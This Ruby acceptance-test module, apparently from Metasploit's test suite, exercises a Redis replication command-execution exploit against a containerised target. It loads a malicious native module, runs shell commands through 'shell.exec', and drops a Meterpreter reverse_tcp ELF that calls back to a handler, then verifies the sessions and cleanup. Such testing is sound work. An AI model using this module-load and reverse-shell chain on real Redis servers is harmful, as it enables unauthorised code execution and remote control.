# frozen_string_literal: true

require 'base64'
require 'digest'
require 'shellwords'

module Acceptance
  # Native loader controls precede owner transport and public session proofs.
  module RedisReplication
    OWNER = 'exploit/linux/redis/redis_replication_cmd_exec'
    # The documented staged family keeps inline Bourne delivery short.
    PAYLOAD = 'linux/x64/meterpreter/reverse_tcp'

    def rr_json(expression)
      output = console_command("irb -e #{("puts 'REDIS_JSON=' + (#{expression}).to_json").inspect}", timeout: 120)
      rows = output.lines.grep(/^REDIS_JSON=/)
      expect(rows.length).to eq(1), output
      JSON.parse(rows.first.delete_prefix('REDIS_JSON='))
    end

    def rr_cli(*)
      target_exec('target', 'redis-cli', '--raw', *)
    end

    def rr_state
      keys = %w[dir dbfilename appendonly save protected-mode repl-diskless-sync]
      {
        config: keys.to_h { |key| [key, rr_cli('CONFIG', 'GET', key)] },
        modules: rr_cli('MODULE', 'LIST'),
        role: rr_cli('INFO', 'replication').lines.grep(/\A(?:role|master_host|master_port|connected_slaves):/),
        files: target_exec('target', 'find', '/data', '-mindepth', '1', '-maxdepth', '1', '-printf', '%f\n').lines.sort
      }
    end

    def rr_save
      File.write(File.join(target_runtime.fetch('artifacts'), 'redis-replication.json'), JSON.pretty_generate(@rr)) if @rr
    end

    def rr_copy(source, path)
      output, status = Open3.capture2e(*target_runtime.fetch('compose'), 'cp', source, 'target:' + path)
      expect(status.success?).to be(true), output
      expect(target_exec('target', 'sha256sum', path).split.first).to eq(Digest::SHA256.file(source).hexdigest)
      output, status = Open3.capture2e(*target_runtime.fetch('compose'), 'exec', '-T', '--user', '0', 'target', 'chown', '999:999', path)
      expect(status.success?).to be(true), output
    end

    def rr_native(command)
      # Redis errors may exit zero: retain the response and verify physical effects.
      output = rr_cli('shell.exec', command)
      @rr[:native_commands] << { command: command, output_base64: Base64.strict_encode64(output) }
      rr_save
      output
    end

    def rr_boot
      @rr = { native_commands: [], sessions: [], post_owner: [] }
      expect(rr_cli('INFO', 'server')).to include('redis_version:5.0.14')
      expect(rr_cli('PING')).to eq("PONG\n")
      expect(rr_cli('MODULE', 'LIST').strip).to eq('')
      @rr[:server] = rr_cli('INFO', 'server')
      @rr[:initial] = rr_state
      @rr[:extension_sha256] = Digest::SHA256.file('data/exploits/redis/exp/exp.so').hexdigest
      path = '/tmp/module-target-redis-native.so'
      rr_copy('data/exploits/redis/exp/exp.so', path)
      expect(rr_cli('MODULE', 'LOAD', path)).to eq("OK\n")
      2.times do |index|
        file = "/tmp/module-target-redis-native-#{index}"
        value = "Native 'quote' \"double\" é λ 💥\r\nsecond line\n"
        begin
          target_exec('target', 'test', '!', '-e', file)
          rr_native("printf %s #{Shellwords.escape(value)} > #{file}")
          expect(target_exec('target', 'cat', file).b).to eq(value.b)
          expect(target_exec('target', 'stat', '-c', '%u', file).strip).to eq('999')
        ensure
          target_exec('target', 'rm', '-f', file)
        end
      end
      @rr[:native_module_passed] = true
      @rr[:observer] = rr_json("begin;require 'base64';require 'digest';require 'msf/util/exe';load 'test/module_targets/laravel/session_control.rb';load 'test/module_targets/druid_sessions/session_control.rb';load 'test/module_targets/rocketmq_sessions/session_control.rb';DruidSessionControl.install(framework);end")
      rr_native_payload
      expect(rr_cli('MODULE', 'UNLOAD', 'shell')).to eq("OK\n")
      target_exec('target', 'rm', path)
      expect(rr_state).to eq(@rr.fetch(:initial))
      @rr[:baseline] = rr_state
      @rr[:native_controls_passed] = true
      rr_save
    ensure
      rr_save
    end

    def rr_native_payload
      console_command('use exploit/multi/handler')
      { 'PAYLOAD' => PAYLOAD, 'LHOST' => listener_host, 'LPORT' => 4444, 'ExitOnSession' => false, 'ReverseListenerBindAddress' => '0.0.0.0' }.each { |name, value| console_command("set #{name} #{value}") }
      expect(console_command('run -j -z')).not_to match(/Exploit failed|Exploit aborted/)
      file = File.join(target_runtime.fetch('artifacts'), 'native-payload.elf')
      generated = rr_json("begin;job=framework.jobs.values.find{|j|j.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;value=RocketmqSessionControl.command(job,#{PAYLOAD.inspect});bytes=Msf::Util::EXE.to_linux_x64_elf(framework,Base64.strict_decode64(value.fetch(:command_base64)));File.binwrite(#{file.inspect},bytes);{sha256:Digest::SHA256.hexdigest(bytes)};end")
      @rr[:native_payload] = generated
      path = '/tmp/module-target-redis-native.elf'
      rr_copy(file, path)
      target_exec('target', 'chmod', '700', path)
      # Keep this genuine SDK call in the foreground to measure its reply while
      # the real staged session bootstraps; the owner has a short read timeout.
      argv = target_runtime.fetch('compose') + ['exec', '-T', 'target', 'redis-cli', '--raw', 'shell.exec', "#{path} >/dev/null 2>&1 </dev/null"]
      started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
      stdin, stdout, stderr, @rr_native_waiter = Open3.popen3(*argv)
      stdin.close
      @rr[:native_foreground] = { argv: argv, pid: @rr_native_waiter.pid }
      reply_observer = Thread.new do
        @rr_native_waiter.join
        @rr[:native_foreground][:reply_elapsed] = Process.clock_gettime(Process::CLOCK_MONOTONIC) - started
      end
      rr_use('exploit/multi/handler', 'native')
      expect(@rr_native_waiter.join(10)).not_to be_nil
      expect(reply_observer.join(5)).not_to be_nil
      @rr[:native_foreground].merge!(elapsed: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started,
                                     exit: @rr_native_waiter.value.exitstatus,
                                     stdout_base64: Base64.strict_encode64(stdout.read),
                                     stderr_base64: Base64.strict_encode64(stderr.read))
      expect(@rr_native_waiter.value.success?).to be(true)
    ensure
      console_command('sessions -K')
      console_command('jobs -K')
      if @rr_native_waiter&.alive?
        Process.kill('TERM', @rr_native_waiter.pid)
        @rr_native_waiter.join(5)
      end
      reply_observer&.join(5)
      stdout&.close
      stderr&.close
      target_exec('target', 'rm', '-f', path) if path
      rr_save
    end

    def rr_use(owner, label)
      row = { owner: owner, label: label }
      @rr[:sessions] << row
      wait_for_expect(90, 0.1) do
        ready = File.readlines(@rr.fetch(:observer).fetch('ready_event_path')).map { |line| JSON.parse(line).fetch('id') }
        row[:session] = rr_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload}}').find do |entry|
          ready.include?(entry.fetch('id')) && entry.values_at('owner', 'payload') == [owner, 'payload/' + PAYLOAD]
        end
        expect(row[:session]).not_to be_nil
      end
      id = row.fetch(:session).fetch('id')
      row[:native_cli_finished_at_ready] = !@rr_native_waiter.alive? if label == 'native'
      path = "/tmp/module-target-redis-session-#{Process.pid}-#{id}"
      row[:proof] = rr_json("LaravelSessionControl.proof(framework,#{id},#{path.inspect},'redis-session',false,component:'redis')")
      pid = row.fetch(:proof).fetch('pid')
      row[:process_stat] = target_exec('target', 'cat', "/proc/#{pid}/stat")
      row[:birth] = row[:process_stat].rpartition(') ').last.split.fetch(19)
      row[:physical_uid] = target_exec('target', 'stat', '-c', '%u', "/proc/#{pid}").strip
      expect(row[:physical_uid]).to eq('999')
      expect(target_exec('target', 'cat', path)).to eq('redis-session')
      expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq('999')
      row[:shutdown] = rr_json("LaravelSessionControl.shutdown(framework,#{id},component:'redis')")
      expect(row.fetch(:shutdown).fetch('fresh_response')).to eq(pid)
      wait_for_expect(90, 0.1) { expect(target_exec('target', 'sh', '-c', 'if test -e "$1"; then printf PRESENT; fi', 'pid', "/proc/#{pid}")).to eq('') }
      rr_json("framework.sessions[#{id}]&.kill;true")
      expect(rr_json('framework.sessions.keys')).not_to include(id)
      row[:used_and_closed] = true
    ensure
      target_exec('target', 'rm', '-f', path) if path
      console_command('jobs -K')
      rr_save
    end

    def rr_finish
      return rr_save unless @rr[:native_controls_passed]

      @rr[:final_state] = rr_state
      @rr[:final_ping] = rr_cli('PING')
      @rr[:remaining_sessions] = rr_json('framework.sessions.keys')
      @rr[:remaining_jobs] = rr_json('framework.jobs.keys')
      expect(@rr[:remaining_sessions]).to eq([])
      expect(@rr[:remaining_jobs]).to eq([])
    ensure
      rr_save
    end
  end
end
